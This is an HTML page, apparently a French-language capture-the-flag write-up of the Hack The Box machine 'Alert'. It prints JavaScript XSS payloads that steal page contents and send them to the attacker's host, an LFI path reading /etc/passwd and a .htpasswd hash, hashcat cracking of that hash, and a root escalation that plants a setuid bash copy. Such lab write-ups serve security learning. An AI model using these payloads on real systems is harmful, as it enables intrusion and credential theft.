@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Alert | Writeup</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Alert" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="weeu weeeu weeu" />
+<meta property="og:description" content="weeu weeeu weeu" />
+<link rel="canonical" href="/HTB/season6/alert.html" />
+<meta property="og:url" content="/HTB/season6/alert.html" />
+<meta property="og:site_name" content="Writeup" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-04-15T09:32:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Alert" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2026-04-15T09:32:00+02:00","datePublished":"2026-04-15T09:32:00+02:00","description":"weeu weeeu weeu","headline":"Alert","mainEntityOfPage":{"@type":"WebPage","@id":"/HTB/season6/alert.html"},"url":"/HTB/season6/alert.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link rel="preload" href="https://fonts.googleapis.com/css?family=Open+Sans:400,700&display=swap" as="style" type="text/css" crossorigin>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#157878">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <a id="skip-to-content" href="#content">Skip to the content.</a>
+
+    <header class="page-header" role="banner">
+      <h1 class="project-name">Alert</h1>
+      <h2 class="project-tagline">weeu weeeu weeu</h2>
+      
+      
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h1 id="outline">Outline</h1>
+<h2 id="foothold">Foothold</h2>
+<ul>
+  <li>Sont disponibles deux sites: un site qui nous demande de nous connecter (sous-domaine) et un qui nous propose de visualiser des fichiers markdown (site principal) puis de les partager.</li>
+  <li>En créant un fichier pour une XSS qui exfiltre les données il est possible de le partager via la page ‘contact us’, ce qui permet de faire exécuter le code javascript souhaité à un bot admin.</li>
+  <li>En exécutant du code javascript il est alors possible de récupérer le contenu de <code class="language-plaintext highlighter-rouge">messages.php</code> puis grâce au contenu de la page et une LFI, de lire n’importe quel fichier.</li>
+  <li>Un fichier de configuration vend la mèche sur l’endroit de stockage d’identifiants qui, une fois craqués, donnent accès à un utilisateur.
+    <h2 id="privesc-to-root">PrivEsc to root</h2>
+  </li>
+  <li>Sur le port <code class="language-plaintext highlighter-rouge">8080</code> tourne un site web qui a vérifie la disponibilité des deux autres sites. En regardant le code source on voit appelé un fichier que l’on peut modifier, qui nous permet d’exécuter les commandes souhaitées.</li>
+</ul>
+
+<h1 id="foothold-1">Foothold</h1>
+
+<p>En plus des ports <code class="language-plaintext highlighter-rouge">22</code> et <code class="language-plaintext highlighter-rouge">80</code>, le port <code class="language-plaintext highlighter-rouge">12227</code> est marqué comme ouvert.</p>
+
+<p>Le site principal permet de visualiser des fichiers markdown.</p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/alert%20images/Pasted%20image%2020260415094227.png"></span></p>
+
+<p>Le sous-domain <code class="language-plaintext highlighter-rouge">statistics</code> présente une page de connexion, d’où le fait qu’elle soit présentée différemment par ffuf.</p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/alert%20images/Pasted%20image%2020260415094611.png"></span></p>
+
+<p>De retour sur la page principal, le lecteur de markdown ressemble à ça:</p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/alert%20images/Pasted%20image%2020260415105756.png"></span></p>
+
+<p>Il se trouve qu’il est possible d’inclure du html dans un document markdown. Par exemple</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script src="http://10.10.15.23:3333/script.js"&gt;&lt;/script&gt;
+</code></pre></div></div>
+
+<p>En envoyant ça comme contenu d’un fichier <code class="language-plaintext highlighter-rouge">xss.md</code>, une requête nous est bien envoyée, ce qui confirme qu’une xss est possible. Il faut modifier le payload de la sorte pour voler le cookie:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fetch("http://10.10.15.23:3333/"+document.cookie)
+  .then(r =&gt; r.text())
+  .then(data =&gt; {
+    // Send it to your server
+    fetch("http://yourip:yourport/?d=" + btoa(data), { mode: "no-cors" });
+  });
+</code></pre></div></div>
+
+<p>Sur le site il existe une autre page intéressante appelée “contact us” qui permet d’envoyer un message à un administrateur. On lui envoie alors le lien que l’on a obtenu avec notre xss.</p>
+
+<p>Si on regarde sur notre listener on voit bien une requête mais rien du tout dans les cookies.</p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/alert%20images/Pasted%20image%2020260415134327.png"></span></p>
+
+<p>L’idée est alors de modifier le script pour aller chercher une donnée qui nous intéresse, le contenu de la pages messages.php.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/messages.php',true);
+req.send();
+function handleResponse() {
+    var body = this.responseText;
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', 'http://10.10.15.23:3334/', true);
+    changeReq.send('body='+body)
+};
+</code></pre></div></div>
+<p>Dans la réponse est indiqué un fichier que l’on peut aussi demander:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/messages.php?file=2024-03-10_15-48-34.txt',true);
+req.send();
+function handleResponse() {
+    var body = this.responseText;
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', 'http://10.10.15.23:3334/', true);
+    changeReq.send('body='+body)
+};
+</code></pre></div></div>
+<p>Cette requête permet en fait de demander n’importe quel fichier grâce à une LFI. Il faut simplement changer le script pour</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/messages.php?file=../../../../../../etc/passwd',true);
+req.send();
+function handleResponse() {
+    var body = this.responseText;
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('get', 'http://10.10.15.23:3334/?content='+btoa(body), true);
+};
+</code></pre></div></div>
+<p>Ainsi qu’ouvrir le port 3333 et le port 3334 puis envoyer le lien de la xss par message et lire la réponse.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/messages.php?file=../../../../../../etc/passwd',true);
+req.send();
+function handleResponse() {
+    var body = this.responseText;
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('get', 'http://10.10.15.23:3334/?content='+btoa(body), true);
+    changeReq.send();
+};
+</code></pre></div></div>
+<p>Il est possible par exemple de lire ainsi le fichier <code class="language-plaintext highlighter-rouge">/etc/passwd</code>.</p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/alert%20images/Pasted%20image%2020260415144756.png"></span></p>
+<p>Ce qui permet par exemple de voir qu’il existe deux utilisateurs: <code class="language-plaintext highlighter-rouge">albert</code> et <code class="language-plaintext highlighter-rouge">david</code>.</p>
+
+<p>Ensuite c’est une question de fichiers. Le fichier <code class="language-plaintext highlighter-rouge">/etc/apache2/sites-enabled/000-default.conf</code> donne le root folder du site: <code class="language-plaintext highlighter-rouge">/var/www/alert.htb</code> et pour <code class="language-plaintext highlighter-rouge">statistics</code>: <code class="language-plaintext highlighter-rouge">/var/www/statistics.alert.htb</code>. Et surtout, dans ce fichier une indication est donnée sur une partie restreinte: <code class="language-plaintext highlighter-rouge">/var/www/statistics.alert.htb/.htpasswd</code> dont le contenu est</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
+</code></pre></div></div>
+
+<p>Ensuite les commandes pour craquer le mot de passe permettent de voir le mode du hash:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 'albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/' &gt; hash.txt
+cut -d: -f2 hash.txt | hashid -m
+hashcat -a 0 -m 1600 hash.txt /usr/share/wordlists/rockyou.txt --username
+</code></pre></div></div>
+
+<p>Le hash est identifié comme un apache md5 (mode 1600) et l’identifiant est <code class="language-plaintext highlighter-rouge">albert:manchesterunited</code>.</p>
+
+<p>Et voilà, le premier accès ssh obtenu.</p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/alert%20images/Pasted%20image%2020260415153324.png"></span></p>
+
+<h1 id="privesc-to-root-1">PrivEsc to root</h1>
+
+<p>En arrivant sur le profil de <code class="language-plaintext highlighter-rouge">albert</code> il est possible de remarquer qu’un processus tourne sur le port 8080. Il faut le forward via ssh pour pouvoir y accéder:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -L 9001:localhost:8080 -N -vv albert@alert.htb
+</code></pre></div></div>
+
+<p>En regardant les fichiers de configuration il est possible de trouver le dossier <code class="language-plaintext highlighter-rouge">/opt/website-monitor</code>, dossier dans lequel tous les fichiers de website-monitor sont. Dans le fichier <code class="language-plaintext highlighter-rouge">monitor.php</code> (qui on peut le deviner/le vérifier avec les logs, tourne avec un cron) il est possible de lire</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>include('config/configuration.php');
+</code></pre></div></div>
+
+<p>Or, il se trouve que ce fichier est modifiable par un groupe dont albert fait partie. On en change donc le contenu pour le suivant:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>system("cp /bin/bash /tmp/rootshell; chmod 7777 /tmp/rootshell");
+</code></pre></div></div>
+
+<p>Et voilà notre accès root.</p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/alert%20images/Pasted%20image%2020260415174236.png"></span></p>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/alert%20images/Pasted%20image%2020260415174258.png"></span></p>
+
+
+      <footer class="site-footer">
+        
+        <span class="site-footer-credits">This page was generated by <a href="https://pages.github.com">GitHub Pages</a>.</span>
+      </footer>
+    </main>
+  </body>
+</html>
